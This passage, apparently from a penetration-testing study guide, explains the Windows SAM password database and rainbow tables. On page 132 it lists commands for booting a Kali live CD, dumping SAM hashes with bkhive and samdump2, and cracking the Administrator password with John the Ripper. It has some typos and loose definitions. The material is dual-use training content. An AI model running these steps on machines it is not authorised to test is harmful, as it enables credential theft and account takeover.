  - '[PAGE 131]


    # Accessing the SAM database and cracking passwords


    ![](img/c6b688dca6570d17db3036b560ef0905_131_0.png)


    The Security Accounts Manager (SAM) is a database in the Windows operating system
    (OS) that contains user names and passwords. SAM is part of the registry and can
    be found on the hard disk.


    Although only hash copy of passwords can be found on SAM files, there are tools
    which can be used to crack the passwords. Two common tools in this category are
    Samdump2 and John the Ripper tools.


    To be able to initiate a SAM database attack you need to gain access to the Windows
    machine (physical or remote).


    Next steps are using live CD to boot the box (with physical access) and dump the
    hash. Then we can work on offline Password Cracking of Hashes.'
  - '[PAGE 132]


    There are tools like Rainbow table which is a list of hashes (out of dictionary
    list) which can be used to compare hashes. This will be a much quicker process
    compare to password cracking as we only compare hashes and not creating one every
    time during the attack.


    Steps to crack a SAM file:


    +   - Boot the PC with Live CD of Kali

    - fdisk -l (Lowercase L) -- To find the Windows filesystem

    - mkdir tempfolder

    - mount /dev/sda2 /root/tempfolder -- This will mount the partition to tempfolder

    - cd /root/tempfolder

    - cd /Windows/System32/config

    - bkhive SYSTEM /root/key.txt -- Get the content of SYSTEM and put it in key.txt

    - samdump2 SAM /root/key.txt > /hashfile.txt -- This will be our hash file which
    we can used with other tools like John the Ripper to crack the password

    - cd /pentest/passwords/john -- Location of Joh the Ripper tool

    - ./john/root/hashfile.txt -format=nt2 -users=Administrator -- This will start
    cracking the hash file to find the password for user Administrator'
  - "[PAGE 133]\n\n# # Describe and Use a Rainbow Table\n\n# # What is a Rainbow Table\
    \ ?\n\n![](img/c6b688dca6570d17db3036b560ef0905_133_0.png)\n\nA rainbow table\
    \ is a listing of all possible plaintext permutations of encrypted passwords specific\
    \ to a given hash algorithm.\n\nRainbow tables are often used by password cracking\
    \ software for network security attacks. All computer systems that require password-based\
    \ authentication store databases of passwords associated with user accounts, typically\
    \ encrypted rather than plaintext as a security measure.\n\n+   - Rainbow table\
    \ will compare the hash with a hash list instead of checking clear text passwords\n\
    \  - This will make it much quicker to find the password\n  - We can download\
    \ the rainbow tables on Internet\n- Using tools like armitage, meterpreter, ophcrack\n\
    - An example of using a rainbow table:\n- Run armitage\n- Do a quick namp scan\
    \ to find the device"
